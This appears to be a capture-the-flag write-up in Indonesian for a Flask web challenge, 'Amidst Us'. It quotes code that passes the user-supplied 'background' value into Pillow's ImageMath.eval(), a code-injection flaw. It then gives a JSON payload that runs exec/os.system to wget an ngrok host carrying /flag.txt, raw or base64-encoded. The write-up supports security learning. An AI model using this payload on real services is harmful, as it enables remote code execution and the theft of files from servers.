# Amidst Us
#easy #web #rce #flask


Pada `util.py` terdapat vulnerability pada `ImageMath.eval()` karena user dapat memberikan input ke dalam fungsi tersebut. Untuk vers pillow di bawah 9.0.0.  
![](attachments/Pasted%20image%2020220611145429.png)

Vulnerable code pada input `background`.
```python
def make_alpha(data):
	color = data.get('background', [255,255,255])

	try:
		dec_img = base64.b64decode(data.get('image').encode())

		image = Image.open(BytesIO(dec_img)).convert('RGBA')
		img_bands = [band.convert('F') for band in image.split()]

		alpha = ImageMath.eval(
			f'''float(
				max(
				max(
					max(
					difference1(red_band, {color[0]}),
					difference1(green_band, {color[1]})
					),
					difference1(blue_band, {color[2]})
				),
				max(
					max(
					difference2(red_band, {color[0]}),
					difference2(green_band, {color[1]})
					),
					difference2(blue_band, {color[2]})
				)
				)
			)''',
			difference1=lambda source, color: (source - color) / (255.0 - color),
			difference2=lambda source, color: (color - source) / color,
			red_band=img_bands[0],
			green_band=img_bands[1],
			blue_band=img_bands[2]
		)

		new_bands = [
			ImageMath.eval(
				'convert((image - color) / alpha + color, "L")',
				image=img_bands[i],
				color=color[i],
				alpha=alpha
			)
			for i in range(3)
		]

		new_bands.append(ImageMath.eval(
			'convert(alpha_band * alpha, "L")',
			alpha=alpha,
			alpha_band=img_bands[3]
		))

		new_image = Image.merge('RGBA', new_bands)
		background = Image.new('RGB', new_image.size, (0, 0, 0, 0))
		background.paste(new_image.convert('RGB'), mask=new_image)

		buffer = BytesIO()
		new_image.save(buffer, format='PNG')

		return {
			'image': f'data:image/png;base64,{base64.b64encode(buffer.getvalue()).decode()}'
		}, 200

	except Exception:
		return '', 400
```

Buat post request dengan menggunakan tombol upload yang berada pada bagian atas dari web.
```
```

Command execution pada Image.eval dalam library Pillow
```sh
"background":["exec('import os; os.system(\"wget https://sth.ngrok.io/`cat /flag.txt`\")')",255,255]}
```


Letakkan pada body dari request
```sh
{"image":"imagerandom-char","background":["exec('import os; os.system(\"wget https://sth.ngrok.io/$(cat /flag.txt | base64)\")')",255,255]}
```

## Sumber
- https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-2331901